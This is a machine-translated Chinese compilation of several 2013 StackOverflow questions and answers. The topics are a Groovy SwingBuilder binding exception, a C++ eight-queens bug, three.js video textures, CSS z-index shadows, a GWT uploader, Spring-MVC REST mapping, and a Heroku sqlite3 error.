# StackOverflow 问答 15163000-15163999

# swing - 为什么在使用与转换器的相互绑定时会出现“IllegalStateException: Attempt to mutate in notification”异常？

> ID：15163002
> 
> 赞同：0
> 
> 时间：2013-03-01T17:03:34.107
> 
> 标签：swing, groovy, griffon

也许我在理解 Griffon 的转换器和 reverseConverter 时遗漏了一些东西。出了什么问题，我应该如何解决这个问题？

感谢@tim_yates 的编辑，但我发现我不仅在 Griffon 中而且在普通的 Groovy 中也遇到了同样的错误，如下所示：

```
import groovy.beans.Bindable
import groovy.swing.SwingBuilder

class Model {
    @Bindable String name
    @Bindable Integer score
}

Model m = new Model()

new SwingBuilder().edt {
    frame(title: 'Untitled', pack: true, show: true) {
        flowLayout()
        label("Name: ")
        textField(columns: 10, text: bind("name", source: m, mutual: true))
        label("Score: ")
        textField(columns: 3, text: bind("score", source: m, 
            reverseConverter: { it.isEmpty()? 0: Integer.parseInt(it) },
            converter: { String.valueOf(it) },
            mutual: true))
        button("Save", actionPerformed: { 
            println "You're saving ${m.name} with score ${m.score}"
        })
        button("Reset Input To Default", actionPerformed: {
            edt {
              m.name = "defaultName"
              m.score = 50
            }
        })
    }
} 
```

堆栈跟踪更详细：

```
Result: groovy.swing.SwingBuilder@ae20b6Exception in thread "AWT-EventQueue-0" 
java.lang.IllegalStateException: Attempt to mutate in notification
    at javax.swing.text.AbstractDocument.writeLock(AbstractDocument.java:1338)
    at javax.swing.text.AbstractDocument.replace(AbstractDocument.java:659)
    at javax.swing.text.JTextComponent.setText(JTextComponent.java:1718)
    at sun.reflect.GeneratedMethodAccessor276.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)
    at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)
    at groovy.lang.MetaClassImpl.setProperty(MetaClassImpl.java:2404)
    at groovy.lang.MetaClassImpl.setProperty(MetaClassImpl.java:3341)
    at org.codehaus.groovy.runtime.InvokerHelper.setProperty(InvokerHelper.java:196)
    at groovy.beans.DefaultPropertyWriter.write(DefaultPropertyWriter.java:28)
    at groovy.beans.DefaultPropertyAccessor.write(DefaultPropertyAccessor.java:30)
    at org.codehaus.groovy.binding.PropertyBinding.setBeanProperty(PropertyBinding.java:236)
    at org.codehaus.groovy.binding.PropertyBinding.access$000(PropertyBinding.java:51)
    at org.codehaus.groovy.binding.PropertyBinding$2.run(PropertyBinding.java:189)
    at org.codehaus.groovy.binding.PropertyBinding.updateTargetValue(PropertyBinding.java:196)
    at org.codehaus.groovy.binding.AbstractFullBinding.fireBinding(AbstractFullBinding.java:51)
    at org.codehaus.groovy.binding.AbstractFullBinding.update(AbstractFullBinding.java:55)
    at org.codehaus.groovy.binding.PropertyBinding$PropertyFullBinding.propertyChange(PropertyBinding.java:279)
    at java.beans.PropertyChangeSupport.fire(PropertyChangeSupport.java:335)
    at java.beans.PropertyChangeSupport.firePropertyChange(PropertyChangeSupport.java:328)
    at java.beans.PropertyChangeSupport.firePropertyChange(PropertyChangeSupport.java:263)
    at java.beans.PropertyChangeSupport.firePropertyChange(PropertyChangeSupport.java:283)
    at java_beans_PropertyChangeSupport$firePropertyChange$0.call(Unknown Source)
    at Model.firePropertyChange(test.groovy)
    at Model$firePropertyChange.callCurrent(Unknown Source)
    at Model.setScore(test.groovy)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)
    at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)
    at groovy.lang.MetaClassImpl.setProperty(MetaClassImpl.java:2404)
    at groovy.lang.MetaClassImpl.setProperty(MetaClassImpl.java:3341)
    at Model.setProperty(test.groovy)
    at org.codehaus.groovy.runtime.InvokerHelper.setProperty(InvokerHelper.java:192)
    at groovy.beans.DefaultPropertyWriter.write(DefaultPropertyWriter.java:28)
    at groovy.beans.DefaultPropertyAccessor.write(DefaultPropertyAccessor.java:30)
    at org.codehaus.groovy.binding.PropertyBinding.setBeanProperty(PropertyBinding.java:236)
    at org.codehaus.groovy.binding.PropertyBinding.access$000(PropertyBinding.java:51)
    at org.codehaus.groovy.binding.PropertyBinding$2.run(PropertyBinding.java:189)
    at org.codehaus.groovy.binding.PropertyBinding.updateTargetValue(PropertyBinding.java:220)
    at org.codehaus.groovy.binding.AbstractFullBinding.fireBinding(AbstractFullBinding.java:51)
    at org.codehaus.groovy.binding.AbstractFullBinding.update(AbstractFullBinding.java:55)
    at groovy.swing.binding.JTextComponentTextBinding.removeUpdate(JTextComponentProperties.java:85)
    at javax.swing.text.AbstractDocument.fireRemoveUpdate(AbstractDocument.java:260)
    at javax.swing.text.AbstractDocument.handleRemove(AbstractDocument.java:623)
    at javax.swing.text.AbstractDocument.remove(AbstractDocument.java:591)
    at javax.swing.text.AbstractDocument.replace(AbstractDocument.java:667)
    at javax.swing.text.JTextComponent.setText(JTextComponent.java:1718)
    at sun.reflect.GeneratedMethodAccessor276.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)
    at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)
    at groovy.lang.MetaClassImpl.setProperty(MetaClassImpl.java:2404)
    at groovy.lang.MetaClassImpl.setProperty(MetaClassImpl.java:3341)
    at org.codehaus.groovy.runtime.InvokerHelper.setProperty(InvokerHelper.java:196)
    at groovy.beans.DefaultPropertyWriter.write(DefaultPropertyWriter.java:28)
    at groovy.beans.DefaultPropertyAccessor.write(DefaultPropertyAccessor.java:30)
    at org.codehaus.groovy.binding.PropertyBinding.setBeanProperty(PropertyBinding.java:236)
    at org.codehaus.groovy.binding.PropertyBinding.access$000(PropertyBinding.java:51)
    at org.codehaus.groovy.binding.PropertyBinding$2.run(PropertyBinding.java:189)
    at org.codehaus.groovy.binding.PropertyBinding.updateTargetValue(PropertyBinding.java:196)
    at org.codehaus.groovy.binding.AbstractFullBinding.fireBinding(AbstractFullBinding.java:51)
    at org.codehaus.groovy.binding.AbstractFullBinding.update(AbstractFullBinding.java:55)
    at org.codehaus.groovy.binding.PropertyBinding$PropertyFullBinding.propertyChange(PropertyBinding.java:279)
    at java.beans.PropertyChangeSupport.fire(PropertyChangeSupport.java:335)
    at java.beans.PropertyChangeSupport.firePropertyChange(PropertyChangeSupport.java:328)
    at java.beans.PropertyChangeSupport.firePropertyChange(PropertyChangeSupport.java:263)
    at java.beans.PropertyChangeSupport.firePropertyChange(PropertyChangeSupport.java:283)
    at java_beans_PropertyChangeSupport$firePropertyChange$0.call(Unknown Source)
    at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:45)
    at java_beans_PropertyChangeSupport$firePropertyChange.call(Unknown Source)
    at Model.firePropertyChange(test.groovy)
    at Model$firePropertyChange.callCurrent(Unknown Source)
    at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallCurrent(CallSiteArray.java:49)
    at Model$firePropertyChange.callCurrent(Unknown Source)
    at Model.setScore(test.groovy)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)
    at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)
    at groovy.lang.MetaClassImpl.setProperty(MetaClassImpl.java:2404)
    at groovy.lang.MetaClassImpl.setProperty(MetaClassImpl.java:3341)
    at Model.setProperty(test.groovy)
    at org.codehaus.groovy.runtime.ScriptBytecodeAdapter.setGroovyObjectProperty(ScriptBytecodeAdapter.java:528)
    at test$_run_closure1_closure2_closure6_closure7.doCall(test.groovy:27)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)
    at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)
    at org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:272)
    at groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:906)
    at org.codehaus.groovy.runtime.callsite.PogoMetaClassSite.call(PogoMetaClassSite.java:39)
    at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:45)
    at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:108)
    at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:116)
    at groovy.swing.SwingBuilder.edt(SwingBuilder.groovy:330)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)
    at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)
    at org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:361)
    at groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:906)
    at org.codehaus.groovy.runtime.callsite.PogoMetaClassSite.callCurrent(PogoMetaClassSite.java:66)
    at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallCurrent(CallSiteArray.java:49)
    at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:133)
    at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:141)
    at test$_run_closure1_closure2_closure6.doCall(test.groovy:25)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:90)
    at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:233)
    at org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:272)
    at groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:906)
    at groovy.lang.Closure.call(Closure.java:412)
    at org.codehaus.groovy.runtime.ConvertedClosure.invokeCustom(ConvertedClosure.java:51)
    at org.codehaus.groovy.runtime.ConversionHandler.invoke(ConversionHandler.java:82)
    at $Proxy11.actionPerformed(Unknown Source)
    at javax.swing.AbstractButton.fireActionPerformed(AbstractButton.java:2018)
    at javax.swing.AbstractButton$Handler.actionPerformed(AbstractButton.java:2341)
    at javax.swing.DefaultButtonModel.fireActionPerformed(DefaultButtonModel.java:402)
    at javax.swing.DefaultButtonModel.setPressed(DefaultButtonModel.java:259)
    at javax.swing.plaf.basic.BasicButtonListener.mouseReleased(BasicButtonListener.java:252)
    at java.awt.Component.processMouseEvent(Component.java:6505)
    at javax.swing.JComponent.processMouseEvent(JComponent.java:3321)
    at java.awt.Component.processEvent(Component.java:6270)
    at java.awt.Container.processEvent(Container.java:2229)
    at java.awt.Component.dispatchEventImpl(Component.java:4861)
    at java.awt.Container.dispatchEventImpl(Container.java:2287)
    at java.awt.Component.dispatchEvent(Component.java:4687)
    at java.awt.LightweightDispatcher.retargetMouseEvent(Container.java:4832)
    at java.awt.LightweightDispatcher.processMouseEvent(Container.java:4492)
    at java.awt.LightweightDispatcher.dispatchEvent(Container.java:4422)
    at java.awt.Container.dispatchEventImpl(Container.java:2273)
    at java.awt.Window.dispatchEventImpl(Window.java:2719)
    at java.awt.Component.dispatchEvent(Component.java:4687)
    at java.awt.EventQueue.dispatchEventImpl(EventQueue.java:703)
    at java.awt.EventQueue.access$000(EventQueue.java:102)
    at java.awt.EventQueue$3.run(EventQueue.java:662)
    at java.awt.EventQueue$3.run(EventQueue.java:660)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDomain.java:76)
    at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDomain.java:87)
    at java.awt.EventQueue$4.run(EventQueue.java:676)
    at java.awt.EventQueue$4.run(EventQueue.java:674)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.security.ProtectionDomain$1.doIntersectionPrivilege(ProtectionDomain.java:76)
    at java.awt.EventQueue.dispatchEvent(EventQueue.java:673)
    at java.awt.EventDispatchThread.pumpOneEventForFilters(EventDispatchThread.java:244)
    at java.awt.EventDispatchThread.pumpEventsForFilter(EventDispatchThread.java:163)
    at java.awt.EventDispatchThread.pumpEventsForHierarchy(EventDispatchThread.java:151)
    at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:147)
    at java.awt.EventDispatchThread.pumpEvents(EventDispatchThread.java:139)
    at java.awt.EventDispatchThread.run(EventDispatchThread.java:97) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-02T17:35:07.823

我相信这是由转换器引起的绑定中的错误，因为它们以绑定认为它在触发时发生变化的方式转换值。如果没有注册转换器（因此在两端强制执行相同的类型），则不会发生错误；这让我认为这是转换器的错。

在我看来，一张票应该在[http://jira.codehaus.org/browse/groovy提出](http://jira.codehaus.org/browse/groovy)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-03T17:09:03.910

从上面的答案中，我也同意这可能是一个错误，应该报告。

对于临时，我将使用此解决方法来防止显示异常：

```
textField(columns: 3, text: bind("score", target: m, 
    converter: { it.isEmpty()? 50: Integer.parseInt(it) },
    reverseConverter: { String.valueOf(it) },
    mutual: true)) 
```

转换器将需要将空字符串转换为模型中相同的默认值，在此示例中为 50。这将满足以下守卫`org.codehaus.groovy.binding.PropertyBinding`：

```
public void updateTargetValue(final Object newValue) {

  Runnable runnable = new Runnable() {
     public void run() {
         ...
         if ((sourceValue==null && newValue==null) || 
              DefaultTypeTransformation.compareEqual(sourceValue, newValue)) {
            // not a change, don't fire it
            return;
         }
     }
  }

} 
```

# c++ - 如何用蛮力解决8皇后一维数组？

> ID：15163016
> 
> 赞同：0
> 
> 时间：2013-03-01T17:04:26.673
> 
> 标签：c++, loops, while-loop, n-queens

我被分配修改一个 8 Queens 程序以使用一维数组并使用蛮力（已经进行了回溯）。我想出了以下代码：

```
#include <cmath>
#include <iostream>
using namespace std;

bool ok(int board[8]){

for(int j = 0; j <= 7; j++){ //check for repeating digits
    cout << "ok loop 1"<<endl;
    for (int k = 0; k <= 7; k++)
    {
        cout << "ok loop 2"<<endl;
        if (board[k] = board[j]){ return false; }
    }
}

for(int c = 7; c >= 0; c--){ //check if position is safe
    cout << "ok loop 3"<<endl;
    //int r = 0;

    for(int i = 1; i <= c; i++){
    cout << "ok loop 4"<<endl;
        if(board[c-i] == c)
            return false;
        else if ((board[c]-i)>0 && board[c-i]-i == 1)

            return false;
        else if ((board[c]+i)<=7 && board[c-i]+i == 1)
            return false;
    } // for loop

} // for loop
    return true;
} // ok

void print(int board[8], int c){
cout << "Solution " << c << ": " << endl;
for(int i = 0; i < 8; i++){
{
    cout << board[i] <<" ";
} 
}

cout << endl;
} 

int main ()
{

int b[8]={0}; //initialize the array
int count = 0;

for(b[0]=0; b[0]<8; b[0]++)
for(b[1]=0; b[1]<8; b[1]++)
    for(b[2]=0; b[2]<8; b[2]++)
        for(b[3]=0 ; b[3]<8; b[3]++)
            for(b[4]=0; b[4]<8; b[4]++)
                for(b[5]=0; b[5]<8; b[5]++)
                    for(b[6]=0; b[6]<8; b[6]++)
                        for(b[7]=0; b[7]<8; b[7]++)
                            if(ok(b)) 
                            {
                                count++;
                                print(b, count);
                            }
system("PAUSE");
return 0;
} 
```

它一直在循环，我不知道为什么。有人愿意帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-02T08:22:45.590

有几点可以改进：

*   如果您传递了对一个由八个字符组成的常量数组的引用，`ok()`而不仅仅是一个指向非常量整数的指针，那么编译器可能会告诉您其中一个问题。
*   女王可以有多少个不同的位置？我会说 64，尽管您的代码建议 8。我将从在整个代码中记录变量和常量的实际含义开始，因为您自己似乎对此感到困惑。
*   您检查 board[x] 是否为 board[y]，但 x 和 y 相等，然后您声称存在重复数字。
*   你在不同的皇后之间有所作为。换句话说，您的程序将找到皇后如何定位在相同的八个位置上的所有排列。这不是错误的，而是低效的。如果你固定位置的数量，那将产生明显的差异。

# three.js - Three.js：Skybox 上的视频纹理

> ID：15163024
> 
> 赞同：1
> 
> 时间：2013-03-01T17:04:36.657
> 
> 标签：three.js, textures, texture-mapping

有人可以使用 WebGLRenderer 帮助处理三个.js 中立方体上的视频纹理。我正在尝试使用 Three.js 从一个文件中渲染一个带有一件视频纹理的立方体而不使用

```
THREE.ImageUtils.loadTextureCube 
```

而是图像，例如 jpg，但我没有看到可见的立方体。理想情况下，我是否需要创建 180 度半球视频全景图，但只能使用立方体。也就是说，我想在一个流中为立方体的所有面放置纹理，而不是切割它，因为如果我在每个面上使用不同的视频纹理，那么这将影响性能。

我正在尝试像这里一样在球体上使用视频纹理

[http://mrdoob.github.com/three.js/examples/webgl_panorama_equirectangular.html](http://mrdoob.github.com/three.js/examples/webgl_panorama_equirectangular.html)

一切正常，但我想在这里使用立方体

[http://mrdoob.github.com/three.js/examples/webgl_materials_cubemap_balls_refraction.html](http://mrdoob.github.com/three.js/examples/webgl_materials_cubemap_balls_refraction.html)

但我没有看到可见的立方体。

我不想将电影文件切割成六个不同的部分，以将它们放在立方体的每个面上，如本例所示。也许在立方体上覆盖材料的其他方法形成一个视频文件，而不是为每个面使用不同的纹理？

谢谢，对不起我的英语。

# html - 将图像移到主要内容 CSS 后面

> ID：15163027
> 
> 赞同：0
> 
> 时间：2013-03-01T17:04:42.897
> 
> 标签：html, css, position, z-index

我的网站中有一些 CSS 有问题

```
this is the main CSS source :
/* html selectors ---- */

html, body {
    font-family: 'Arial Unicode MS';
    margin: 0;
    padding: 0;
    background-repeat: repeat-x;
    background-color: white;
    direction: rtl;
    font-size: 10.3pt;
}

h1, h2, h3, h4, h5, h6 {
    margin: 0;
}

h1 {
    font-size: 17pt;
    text-decoration: underline;
    top: 3px;
    padding-bottom: 10px;
    line-height: 25px;
}

h2 {
    font-family: david;
    font-size: 11pt;
    color: #191970;
}

h3 {
    font-size: 16pt;
    color: white;
    margin-left: 15px;
    font-weight: bold;
    margin-bottom: 20px;
    padding-right: 30px;
    padding-top: -55px;
    font-family: 'Arial Unicode MS';
}

/*page -----------*/
#page {
    width: 900px;
    padding: 0px;
    margin: 0 auto;
    direction: rtl;
    position: relative;
    z-index: 100;
    z-index: 5;
    background-image: url("images/bgimage.png");
}

#leftshadow {
    width: 100px;
    height: 900px;
    background-image: url("images/leftshadow.png");
    position: absolute;
    right: 840px;
    z-index: none;
    top: -25px;
}

#rightshadow {
    width: 100px;
    height: 900px;
    background-image: url("images/rightshadow.png");
    position: absolute;
    right: -45px;
    z-index: none;
    top: -25px;
} 
```

我的问题是如何将 image-shdow 移回主要内容后面？

我用 z-index 尝试了很多，但我找不到解决方案，你能帮我解决这些问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:54:56.173

我建议重新设计您的 DOM 结构以适应这种情况，如下所示：

```
<div class="content">
  <div class="page"></div>
  <div class="leftshadow shadow"></div>
  <div class="rightshadow shadow"></div>
</div> 
```

看看这个新结构如何工作的小提琴 - [http://jsfiddle.net/wHgm8/](http://jsfiddle.net/wHgm8/)

你也可以，如果你想在页面周围有一个干净的阴影，使用 css3 box-shadow，例如：http: [//jsfiddle.net/ASc7J/](http://jsfiddle.net/ASc7J/)虽然支持较新的浏览器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:09:16.083

`position`除了属性之外，您忘记使用`z-index`属性 .. z-index 将不起作用，除非`z-index`使用以下任一方式定位应用了该属性的元素：

`position: relative;` `position: absolute;` `position: fixed;`

添加其中之一（在您的情况下最好相对），它将起作用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-02-11T05:59:17.807

在你的代码中试试这个： **box-shadow: 5px 0px 5px gray;** 在上面的语法中，5px 代表左边，0px 代表顶部和底部，5px 代表右边。使用这些值，直到您感到舒适为止。还要确保您使用颜色的十六进制值并且适合阴影。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-02-16T16:24:11.023

您需要两个位置命令，并且“none”不是有效的 z-index 值。-1 对我有用。

```
style="position:relative; z-index:-1;" 
```

# java - MultiUploader 渲染问题 (GWT + mvp4g)

> ID：15163030
> 
> 赞同：1
> 
> 时间：2013-03-01T17:04:47.247
> 
> 标签：java, gwt, visibility, mvp4g

我正在使用 MultiUploader，有时会裁剪“上传”按钮。仅当页面加载时上传器按钮不可见时才会发生这种情况。当我进一步使其可见时，按钮变得可见，但被裁剪。如果页面使用 param=true 加载，一切正常。

```
//mvp4g is used
public void onEventBusEventName(boolean param) {
 ...
 view.uploader.setVisible(param);
 ...
 this.view.logoUploader.setI18Constants(UiConstants.INSTANCE);
 this.view.logoUploader.setStyleName("logo-uploader");
 view.logoUploader.addOnFinishUploadHandler(new IUploader.OnFinishUploaderHandler() {
  @Override
  public void onFinish(IUploader uploader) {
   if (uploader.getStatus() == IUploadStatus.Status.SUCCESS) {
    String fileId = uploader.getFileInput().getName();
    updateLogo(fileId);
   } else {
    Window.alert(uploader.getStatus().toString());
   }
  }
 });
 ...
 eventBus.setCenterContent(view); //setting root widget to specified view currently showing
} 
```

它的外观：http: [//imgur.com/i0rxerJ.jpg](http://imgur.com/i0rxerJ.jpg)

类视图：

```
@UiField
MultiUploader logoUploader; 
```

类视图UI：

```
<gwtupload:MultiUploader type="BUTTON" ui:field="logoUploader" title="Upload new logo"
                                     avoidRepeatFiles="true" maximumFiles="1"
                                     validExtensions="jpg,png,jpeg,bmp"/> 
```

CSS：

```
.logo-uploader {
 margin-bottom: 10px;
 float: left;
}

.logo-uploader .gwt-Button {
 display: inline-block;
 width: 171px;
 height: 26px;
 background: url(../i/sprite.png) -1px -335px no-repeat;
 text-align: center;
 text-decoration: none;
 line-height: 1;
 border: none;
 color: #195c84;
 cursor: pointer;
}
.logo-uploader .gwt-Button:hover {
 background: url(../i/sprite.png) -1px -362px no-repeat;
} 
```

# java - 修复：“未找到映射”尝试使用 Spring-MVC 设置 RESTfull 接口

> ID：15163035
> 
> 赞同：2
> 
> 时间：2013-03-01T17:05:07.647
> 
> 标签：java, rest, spring-mvc

这个问题解决了。有人创建了一个名为 mvc-dispatcher.xml 的文件，但它的配置不正确。该文件会自动加载，因为它的名称与 servlet 相同。

我要感谢所有试图帮助我解决此问题的人。我在这里保留这个问题，因为它实际上解释了如何创建 REST 接口。它完美地工作。

* * *

我正在尝试使用 Spring-MVC 设置 RESTful 接口。服务器启动时没有问题，但每当我尝试调用 REST 接口时，我都会收到以下消息：

```
41 WARN [springframework.web.servlet.PageNotFound] No mapping found for HTTP request with URI [/myweb/rest/asd/aaa] in DispatcherServlet with name 'mvc-dispatcher' 
```

似乎我发送的 URL（`http://localhost:8080/myweb/rest/asd/qwe`例如）没有被任何控制器“捕获”。我究竟做错了什么？

我不知道我还能尝试什么。我正在使用 Java 1.7.0_15、Tomcat 7.0.34 和 Spring 3.1.4.RELEASE

在我的 web.xml 中：

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd" id="WebApp_ID" version="3.0">

<display-name>MyWeb</display-name>
<welcome-file-list>
    <welcome-file>index.xhtml</welcome-file>
</welcome-file-list>

<!-- Listener for MVC spring -->
<listener>
    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
</listener>
<listener>
    <listener-class>org.springframework.web.context.request.RequestContextListener</listener-class>
</listener>

<!-- Servlet for MVC spring --> 
<servlet>
    <servlet-name>mvc-dispatcher</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <load-on-startup>1</load-on-startup>
</servlet>
<servlet-mapping>
    <servlet-name>mvc-dispatcher</servlet-name>
    <url-pattern>/rest/*</url-pattern>
</servlet-mapping>

<!-- Loading web properties -->
<context-param>
    <param-name>contextConfigLocation</param-name>
    <param-value>/WEB-INF/applicationContext*.xml</param-value>
</context-param> 
```

在我的 applicationContext.xml 中：

```
<context:component-scan base-package="com.myweb.*" />
<context:annotation-config/>
<tx:annotation-driven/>
<mvc:annotation-driven /> 
```

最后，我的控制器类：

```
import org.apache.log4j.Logger;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class RestController {

    private static Logger LOG = Logger.getLogger(RestController.class);

    @RequestMapping("/asd/{test}")
    public void test(@PathVariable String test) {
        LOG.info("You sent "+test);
    }
} 
```

尝试更改方法的 @RequestMapping 但仍然无效：

```
@RequestMapping(method=RequestMethod.GET)
public void test() {
    LOG.info("You sent something");
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:09:25.777

你的映射是错误的。

您正在请求`/rest/asd/aaa`，但您的映射是针对`/asd/{test}`.

您需要更改`@RequestMapping("/asd/{test}")`为`@RequestMapping("/rest/asd/{test}")`

或添加`@RequestMapping("/rest")`到您的控制器类

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:09:13.323

尝试用 url 来注释你的控制器类`@RequestMapping("/rest")`来处理所有请求

> /webapp/休息/

您还应该通过`org.springframework.web.context.ContextLoaderListener`侦听器配置您的上下文。我想你没有加载`applicationContext.xml`

将此部分添加到您的`web.xml`

```
<!--spring bootstrap listener  -->
<context-param>  
        <param-name>contextConfigLocation</param-name>  
        <param-value>/WEB-INF/config/applicationContext.xml</param-value>  
</context-param>

<listener>  
    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>  
</listener> 
```

# ruby - RVM / Heroku / Gem：惰性符号绑定失败

> ID：15163036
> 
> 赞同：1
> 
> 时间：2013-03-01T17:05:08.300
> 
> 标签：ruby, sqlite, heroku, gem, rvm

我无法完成这项工作：

```
apaw:x apaw$ heroku db:pull

dyld: lazy symbol binding failed: Symbol not found: _rb_intern2
  Referenced from: /Users/apaw/.rvm/gems/ruby-1.9.3-p385/gems/sqlite3-ruby-1.3.2/lib/sqlite3/sqlite3_native.bundle
  Expected in: flat namespace

dyld: Symbol not found: _rb_intern2
  Referenced from: /Users/apaw/.rvm/gems/ruby-1.9.3-p385/gems/sqlite3-ruby-1.3.2/lib/sqlite3/sqlite3_native.bundle
  Expected in: flat namespace 
```

我尝试了不同的 sqlite3 gem 版本，但它们都失败了。

在我通过 rvm 安装 ruby​​-1.9.3-p385 之前它运行良好

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-05T17:16:11.370

这可能不是您想要的答案，但我相信这是您需要的答案。

首先，假设您使用的是 Heroku Postgres，您确实应该在本地使用 Postgres 来实现开发/生产平价。您的开发和部署环境之间的对等性可以防止由于环境之间的差异而引入细微的错误。RVM、捆绑器等。人。努力在其他领域实现这一目标；我恳请您对您的数据库这样做。理论上，适配器抽象出支持服务（数据库、缓存系统）中的任何差异。实际上，支持服务之间的差异意味着会出现微小的不兼容性，从而导致在开发中工作并通过测试的代码在生产中失败。

其次，这些`db:pull/push` 命令已被弃用，您应该改用这些命令`pgbackups:capture/restore`。有关更多信息，请参阅[使用 PG 备份导入和导出 Heroku Postgres 数据库](https://devcenter.heroku.com/articles/heroku-postgres-import-export)。`db:pull`在处理不同的后端（postgres 远程，sqlite3 本地）时，这是出了名的糟糕。您上面的错误就是一个很好的例子。虽然使用 pgbackups 可以说是更多步骤，但它更安全可靠，并且对脚本来说应该是微不足道的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-06T20:50:29.620

该平台明确*不支持*SQLite ，因为文件系统是[短暂](https://devcenter.heroku.com/articles/dynos#ephemeral-filesystem)的。一旦您重新启动测功机，您写入 sqlite 数据库的内容就会消失。改用[heroku postgres](https://devcenter.heroku.com/articles/heroku-postgresql)。

如果您仍然希望这样做，您可以 fork [ruby​​ buildpack](http://github.com/heroku/heroku-buildpack-ruby)并对其进行更改，以便将 sqlite3 库文件捆绑到您的应用程序中。创建自定义构建包的文档在[这里](https://devcenter.heroku.com/articles/buildpacks#creating-a-buildpack)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-09T17:37:42.727

我已经通过卸载 heroku 工具带并安装 heroku gem 来做到这一点。

谢谢大家的提示

